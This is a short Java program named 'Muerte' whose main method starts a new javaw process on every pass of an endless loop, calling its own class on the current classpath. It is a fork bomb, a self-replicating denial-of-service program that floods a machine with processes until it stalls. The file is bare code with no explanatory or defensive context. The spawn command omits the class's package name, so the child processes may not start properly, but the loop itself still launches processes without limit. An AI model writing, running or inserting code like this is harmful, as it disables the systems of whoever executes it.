package main;

import java.io.IOException;

public class Muerte {
	public static void main(String[] args) {
		while(true) {
			try {
				Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "Muerte"});
			} catch (IOException e) {}
		}
	}
}
